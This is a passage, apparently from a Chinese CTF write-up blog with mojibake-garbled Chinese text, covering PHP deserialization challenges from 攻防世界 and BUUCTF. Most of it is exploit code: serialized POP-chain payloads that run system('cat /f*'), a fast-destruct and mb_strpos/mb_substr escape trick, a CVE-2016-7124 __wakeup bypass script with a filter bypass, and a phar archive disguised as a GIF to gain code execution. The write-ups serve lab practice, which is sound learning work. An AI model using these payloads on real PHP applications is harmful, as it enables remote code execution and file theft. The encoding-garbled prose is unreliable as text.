class="hljs-number">1</span>:<span class="hljs-string">&quot;C&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;c&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;T&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;t&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;F&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;f&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;E&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;e&quot;</span>;O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;R&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;r&quot;</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">&quot;system(&quot;</span>cat /f*<span class="hljs-string">&quot;);&quot;</span>;&#125;&#125;&#125;&#125;&#125;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;R:<span class="hljs-number">9</span>;&#125;s:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><h4 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h4><p>1.è¿˜å¯ä»¥åˆ©ç”¨fast destructé€ƒè„±å¼‚å¸¸</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">O:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;Hacker&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;start&quot;</span>;s:<span class="hljs-number">203</span>:<span class="hljs-string">&quot;&#123;&#123;&#123;O:6:&quot;</span>Hacke<span class="hljs-string">r&quot;:3:&#123;s:5:&quot;</span>start<span class="hljs-string">&quot;;O:1:&quot;</span>C<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>c<span class="hljs-string">&quot;;O:1:&quot;</span>T<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>t<span class="hljs-string">&quot;;O:1:&quot;</span>F<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>f<span class="hljs-string">&quot;;O:1:&quot;</span>E<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span>e<span class="hljs-string">&quot;;O:1:&quot;</span>R<span class="hljs-string">&quot;:1:&#123;s:1:&quot;</span><span class="hljs-string">r&quot;;s:18:&quot;</span>system(<span class="hljs-string">&quot;cat /f*&quot;</span>);<span class="hljs-string">&quot;;&#125;&#125;&#125;&#125;&#125;s:3:&quot;</span>end<span class="hljs-string">&quot;;s:6:&quot;</span>hacke<span class="hljs-string">r&quot;;s:8:&quot;</span>username<span class="hljs-string">&quot;;R:8;&#125;&#125;&#125;&#125;&quot;</span>;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;end&quot;</span>;N;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;username&quot;</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;hacker&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><p>åˆ å»æœ«å°¾çš„å››ä¸ª}}}}æ¥ç ´ååºåˆ—åŒ–å­—ç¬¦ä¸²ç»“æ„ï¼Œåˆ©ç”¨fast destructé€ƒè„±å¼‚å¸¸</p><p>2.mb_strposä¸mb_substræ‰§è¡Œå·®å¼‚</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">æ¯å‘é€ä¸€ä¸ª<span class="hljs-variable">%f0abc</span>ï¼Œmb_strposè®¤ä¸ºæ˜¯<span class="hljs-number">4</span>ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯<span class="hljs-number">1</span>ä¸ªå­—èŠ‚ï¼Œç›¸å·®<span class="hljs-number">3</span>ä¸ªå­—èŠ‚<br>æ¯å‘é€ä¸€ä¸ª<span class="hljs-variable">%f0</span><span class="hljs-variable">%9</span>fab<span class="hljs-punctuation">,</span>mb_strposè®¤ä¸ºæ˜¯<span class="hljs-number">3</span>ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯<span class="hljs-number">1</span>ä¸ªå­—èŠ‚ï¼Œç›¸å·®<span class="hljs-number">2</span>ä¸ªå­—èŠ‚<br>æ¯å‘é€ä¸€ä¸ª<span class="hljs-variable">%f0</span><span class="hljs-variable">%9</span>f<span class="hljs-variable">%9</span>fa<span class="hljs-punctuation">,</span>mb_strposè®¤ä¸ºæ˜¯<span class="hljs-number">2</span>ä¸ªå­—èŠ‚ï¼Œmb_substrè®¤ä¸ºæ˜¯<span class="hljs-number">1</span>ä¸ªå­—èŠ‚ï¼Œç›¸å·®<span class="hljs-number">1</span>ä¸ªå­—èŠ‚<br></code></pre></td></tr></table></figure><h3 id="4-3-æ”»é˜²ä¸–ç•Œ-Web-php-unserialize"><a href="#4-3-æ”»é˜²ä¸–ç•Œ-Web-php-unserialize" class="headerlink" title="4.3 [æ”»é˜²ä¸–ç•Œ]Web_php_unserialize"></a>4.3 [æ”»é˜²ä¸–ç•Œ]Web_php_unserialize</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123; <br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123; <br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>; <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123; <br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123; <br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>; <br>        &#125; <br>    &#125; <br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123; <br>    <span class="hljs-variable">$var</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]); <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="hljs-variable">$var</span>)) &#123; <br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;stop hacking!&#x27;</span>); <br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$var</span>); <br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&quot;index.php&quot;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æœ¬é¢˜çš„popé“¾ååˆ†ç®€å•ï¼Œç›´æ¥åˆ©ç”¨Demoè¯»å–fl4g.phpå³å¯ï¼Œä½†éœ€è¦åˆ©ç”¨cve-2016-7124ç»•è¿‡__wakeupï¼Œä»¥åŠå¤„ç†å¥½privateå­—æ®µã€‚</p><p>æ¥ä¸‹æ¥æ˜¯ç»•è¿‡è¿‡æ»¤ï¼Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…çš„æ¨¡å¼æ˜¯O:å’ŒC:ï¼Œåªéœ€è¦æ›¿æ¢æˆO+:å’ŒC+: å³å¯</p><p>æœ€åå†è¿›è¡Œbase64ç¼–ç </p><p>ä½†æ˜¯ç›´æ¥æŠŠç»“æœä¸¢è¿›å·¥å…·é‡Œç¼–ç å¹¶ä¸æˆåŠŸï¼ŒæŸ¥è¯¢èµ„æ–™å¾—çŸ¥è¿™é‡Œçš„fileå˜é‡ä¸ºç§æœ‰å˜é‡ï¼Œæ‰€ä»¥åºåˆ—åŒ–ä¹‹åçš„å­—ç¬¦ä¸²å¼€å¤´ç»“ å°¾å„æœ‰ä¸€ä¸ªç©ºç™½å­—ç¬¦ï¼ˆå³%00ï¼‰ï¼Œå­—ç¬¦ä¸²é•¿åº¦ä¹Ÿæ¯”å®é™…é•¿åº¦å¤§2ï¼Œå¦‚æœå°†åºåˆ—åŒ–ç»“ æœå¤åˆ¶åˆ°åœ¨çº¿çš„base64ç½‘ç«™è¿›è¡Œç¼–ç å¯èƒ½å°±ä¼šä¸¢æ‰ç©ºç™½å­—ç¬¦ï¼Œæ‰€ä»¥è¿™é‡Œç›´æ¥åœ¨ php ä»£ç é‡Œè¿›è¡Œç¼–ç ã€‚ç±»ä¼¼çš„è¿˜æœ‰protectedç±»å‹çš„å˜é‡ï¼Œåºåˆ—åŒ–ä¹‹åå­—ç¬¦ä¸²é¦– éƒ¨ä¼šåŠ ä¸Š%00*%00ã€‚ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-variable">$file</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">echo</span> @<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;file, <span class="hljs-literal">true</span>);<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;file != <span class="hljs-string">&#x27;index.php&#x27;</span>) &#123;<br>            <span class="hljs-comment">//the secret is in the fl4g.php</span><br>            <span class="hljs-variable language_">$this</span>-&gt;file = <span class="hljs-string">&#x27;index.php&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Demo</span>(<span class="hljs-string">&quot;fl4g.php&quot;</span>);<br><span class="hljs-comment">//O:4:&quot;Demo&quot;:1:&#123;s:10:&quot; Demo file&quot;;s:8:&quot;fl4g.php&quot;;&#125;</span><br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;O:4&#x27;</span>,<span class="hljs-string">&#x27;O:+4&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-variable">$b</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;1:&#123;&#x27;</span>,<span class="hljs-string">&#x27;2:&#123;&#x27;</span>,<span class="hljs-variable">$b</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure><h3 id="4-4-BUUCTF-UnserializeOne"><a href="#4-4-BUUCTF-UnserializeOne" class="headerlink" title="4.4 [BUUCTF]UnserializeOne"></a>4.4 [BUUCTF]UnserializeOne</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">#Something useful for you : https://zhuanlan.zhihu.com/p/377676274</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to NewStarCTF, &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        (<span class="hljs-variable language_">$this</span>-&gt;func)();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$var</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;CTFers&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$fun</span>, <span class="hljs-variable">$var</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;cla = <span class="hljs-keyword">clone</span> <span class="hljs-variable">$var</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__clone</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;obj-&gt;cmd))&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;success&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br></code></pre></td></tr></table></figure><p>å…ˆå†™å‡ºpopé“¾</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">//Start<span class="hljs-number">::</span>__destruct -&gt; S<span class="hljs-number">ec::</span>__toString -&gt; Easy<span class="hljs-number">::</span>__call -&gt; <span class="hljs-number">eeee::</span>__clone -&gt; Start<span class="hljs-number">::</span>__isset -&gt; S<span class="hljs-number">ec::</span>__invoke<br></code></pre></td></tr></table></figure><p>php7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿï¼Œprivateå±æ€§æ—¶å¯ä»¥åœ¨åºåˆ—åŒ–æ—¶æ”¹æˆpublicååºåˆ—åŒ–ä¾ç„¶å¯ä»¥,ä½†æ˜¯åè¿‡æ¥å°±ä¸è¡Œäº†,å¦‚æœæ˜¯publicä½ ç”¨privateå°±ä¸è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Start</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sec</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Easy</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cla</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">eeee</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;<br><br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Easy</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">eeee</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Start</span>();<br><span class="hljs-variable">$a</span>-&gt;name-&gt;<span class="hljs-keyword">var</span>-&gt;obj-&gt;func = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sec</span>();<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p><img src="https://pic1.imgdb.cn/item/69577f7ec312a4f35ff94e1b.png"></p><h3 id="4-5-BUUCTF-UnserializeThree"><a href="#4-5-BUUCTF-UnserializeThree" class="headerlink" title="4.5 [BUUCTF]UnserializeThree"></a>4.5 [BUUCTF]UnserializeThree</h3><p>ä¸€æ‰“å¼€æ˜¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ ç³»ç»Ÿï¼ŒæŸ¥çœ‹æºç å‘ç°class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&gt;|&lt;|\?|php|&quot;</span>.<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%0a&quot;</span>).<span class="hljs-string">&quot;/i&quot;</span>,<span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>            <span class="hljs-comment">//Same point ,can you bypass me again?</span><br>            <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;#&quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No!&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>å‘ç°è¦ç”¨pharååºåˆ—åŒ–å’Œç»•è¿‡å®ç°RCE</p><p>è¿™é‡Œ &lt; &gt; ? phpå’Œ%0aè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥ä¸å¯ä»¥ç”¨?&gt;&lt;?php æ¥é—­åˆå‰é¢çš„#å·äº†ï¼Œä½†æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨%0d</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Evil</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br>&#125;<br><span class="hljs-variable">$test</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Evil</span>();<br><span class="hljs-variable">$test</span>-&gt;cmd= <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-string">&quot;%0d&quot;</span>).<span class="hljs-string">&#x27;system(&quot;cat /flag&quot;);&#x27;</span>;<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;b.phar&quot;</span>); <span class="hljs-comment">//æ–‡ä»¶å</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<span class="hljs-comment">//ä¸çŸ¥é“ä¸ºå•¥ï¼Œä¸åŠ è¿™è¡Œç”Ÿæˆä¸äº†.pharæ–‡ä»¶</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetaData</span>(<span class="hljs-variable">$test</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶å‘ç°.pharè¢«banäº†ï¼Œé‚£å°±ä¼ªè£…æˆ.gifæ–‡ä»¶</p><p><img src="https://pic1.imgdb.cn/item/6957ba2b912e73dbe61268d2.png"></p><h3 id="4-6-BUUCTF-UnserializeAgain"><a href="#4-6-BUUCTF-UnserializeAgain" class="headerlink" title="4.6 [BUUCTF]UnserializeAgain"></a>4.6 [BUUCTF]UnserializeAgain</h3><p>æŸ¥çœ‹æºç ï¼Œæç¤ºé¥¼å¹²ï¼ŒæŸ¥çœ‹cookieï¼Œå‘ç°pairing.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 